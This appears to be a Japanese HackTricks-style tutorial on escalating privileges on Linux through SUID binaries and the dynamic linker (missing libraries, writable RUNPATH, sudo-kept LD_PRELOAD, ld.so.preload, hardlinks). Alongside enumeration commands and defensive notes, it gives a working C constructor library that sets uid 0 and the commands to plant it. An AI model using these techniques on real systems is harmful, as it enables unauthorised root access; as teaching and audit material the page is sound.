# SUID Shared Library と Linker Abuse

SUID バイナリは通常、直接的なコマンド実行について調査されますが、custom SUID プログラムは dynamic linker を介しても脆弱になる可能性があります。共通するテーマは単純です。特権付きの executable が、権限の低いユーザーから影響を受ける可能性のある path または configuration から code をロードするというものです。<sup>[[1]](#references)</sup>

このページでは、missing libraries、writable library directories、`RPATH`/`RUNPATH`、sudo 経由の `LD_PRELOAD`、linker configuration、SUID hardlink confusion など、一般的な technique のパターンに焦点を当てます。

## 高速な Enumeration

まず、通常とは異なる SUID files を見つけ、それらが dynamically linked かどうかを確認します。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
非標準の場所、custom application paths、package-managed directories の外部にある root 所有の binaries、そして writable directories から load される dependencies に注目します。<sup>[[1]](#references)</sup>

有用な writeability checks:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

一部のカスタムSUIDバイナリは、存在しないshared objectをloadしようとします。見つからないパスがattackerの制御下にあるdirectory内の場合、バイナリがeffective userとしてattackerが用意したcodeをloadする可能性があります。<sup>[[1]](#references)</sup>

`strace`のsyscall filterで、失敗したlibrary lookupを見つけます。<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
バイナリが `libexample.so` を writable なパスで検索する場合、最小限の proof library では constructor を使用できます。検証中は、影響の証明を harmless に保ってください。<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
バイナリが読み込もうとする正確なファイル名でビルドします:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
悪用可能な状態は、library が存在しないことだけではありません。攻撃者は、特権 loader が受け入れるパスに互換性のある shared object を配置できなければなりません。<sup>[[1]](#references)</sup>

## 書き込み可能な Library Directory

すべての依存関係が存在していても、それらの解決に使用されるディレクトリのいずれかが書き込み可能な場合があります。これにより、読み込まれる library を置き換えたり、同じ名前の、より優先度の高い library を配置したりできる可能性があります。<sup>[[1]](#references)</sup>

依存関係のパスを確認します。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
ディレクトリが書き込み可能な場合は、lab で copy-safe なアプローチを使って検証してください。live host 上で system libraries を置き換えると、同時に起動するプロセスが一貫性のない library versions を使用する状態になる可能性があります。<sup>[[8]](#references)</sup>

## RPATH と RUNPATH

`RPATH` と `RUNPATH` は、loader に libraries を検索する場所を示す dynamic-section entries です。attacker-writable directories を指している場合、SUID programs では危険です。<sup>[[1]](#references)</sup>

以下で検出します。<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
危険な出力の例:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib` が書き込み可能で、バイナリが `libcustom.so` を必要とする場合、攻撃者はそこに悪意のある `libcustom.so` を配置できる可能性があります。<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` と `RUNPATH` は、すべての解決処理の詳細において同一ではありませんが、privilege-escalation の確認における実際の問いは同じです。つまり、SUID binary が attacker-writable directory 内で library name を検索するかどうかです。<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH and SUID

通常の program では、`LD_PRELOAD` と `LD_LIBRARY_PATH` によって shared object の loading を強制または誘導できます。SUID program では、dynamic loader は通常 secure-execution mode に入り、危険な environment variable を無視します。<sup>[[1]](#references)</sup>

つまり、user が `LD_PRELOAD` を設定できるというだけでは、通常の SUID binary は脆弱ではありません。<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
一般的な例外は、対象コマンドに対して loader 変数の設定または保持を許可する sudo policy です。`sudo -l` で `env_keep+=LD_PRELOAD` や `env_keep+=LD_LIBRARY_PATH` などのエントリを確認してください。対象が dynamically linked であれば、attacker-controlled code を読み込む可能性があります:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
これらのケースを混同しないでください。上記の loader と sudo policy rules によって区別されます:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- 通常の SUID binary に対する `LD_PRELOAD`: 通常は secure execution によってブロックされます。
- sudo によって保持される `LD_PRELOAD`: exploit できる可能性があります。
- writable path に `.so` が存在しない場合: SUID binary がその path を自然に load するときに exploit できます。
- writable directory を指す `RPATH`/`RUNPATH`: 必要な library を制御できる場合に exploit できます。
- `/etc/ld.so.preload` または linker config への write access: system-wide に影響し、impact が大きくなります。

## Linker Configuration

`ld.so` は linker cache と `/etc/ld.so.preload` を使用します。`ldconfig` は `/etc/ld.so.conf` と、そこから include される files（一般的には `/etc/ld.so.conf.d/`）からその cache を構築します。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

High-value checks:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration は、単一の脆弱な SUID binary よりも通常深刻です。これは、動的リンクされる多くの process に影響を与える可能性があるためです。`/etc/ld.so.preload` は、特権 process に shared object を強制的に読み込ませることができるため、特に危険です。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlink によって、同じ SUID inode を複数の名前で表示させることができます。<sup>[[9]](#references)</sup>これは、特権 helper を隠したり、cleanup を混乱させたり、単純な path ベースの review を bypass したりするのに役立ちます。

複数の link を持つ SUID file を検索します。<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
同じ inode へのすべてのパスを調査する：<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
この abuse は、hardlink が permissions を変更することではありません。abuse の本質は path confusion です。つまり、privileged inode に、defenders や scripts が想定していない name 経由で到達できる可能性があります。<sup>[[9]](#references)</sup> inode と hardlink の workflow について詳しくは、[Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) を参照してください。

## Defensive Notes

- SUID バイナリは最小限にし、audit を実施し、可能な限り package-managed にする。
- writable または application-managed な directories を指す `RPATH`/`RUNPATH` entries は避ける。<sup>[[1]](#references)[[8]](#references)</sup>
- library directories は root-owned にし、通常の users が writable にできないようにする。<sup>[[8]](#references)</sup>
- `LD_PRELOAD`、`LD_LIBRARY_PATH`、その他同様の loader variables を sudo 経由で保持しない。<sup>[[1]](#references)[[5]](#references)</sup>
- `/etc/ld.so.preload`、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、および予期しない SUID files を monitor する。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- hardlinked SUID files を review し、standard system paths の外部にある custom SUID wrappers を調査する。<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
